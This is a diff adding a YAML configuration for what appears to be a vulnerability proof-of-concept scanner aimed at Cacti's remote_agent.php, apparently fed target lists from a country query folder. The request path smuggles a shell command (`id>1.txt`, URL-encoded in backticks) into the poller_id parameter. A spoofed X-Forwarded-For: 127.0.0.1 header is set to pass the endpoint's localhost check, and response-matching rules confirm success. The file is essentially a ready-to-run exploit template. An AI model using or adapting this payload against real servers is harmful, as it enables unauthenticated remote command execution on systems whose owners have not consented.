@@ -1,0 +1,16 @@
+targetPath: /remote_agent.php?action=polldata&local_data_ids%5B0%5D=6&host_id=1&poller_id=%60id%3E1.txt%60
+targetMethod: get
+targetTimeout: 2
+targetProfixs:
+    http: 127.0.0.1:7890
+targetAllowRedirects: false
+targetHeaders:
+    X-Forwarded-For: 127.0.0.1
+targetJson:
+targetData:
+targetReExpression:
+    respStatusCode: 200
+    respBody: value
+targetDir: ../countryQueryResult/
+targetOutputDir: ../2CVE漏洞POC目标/cacti/
+targetRestText: false
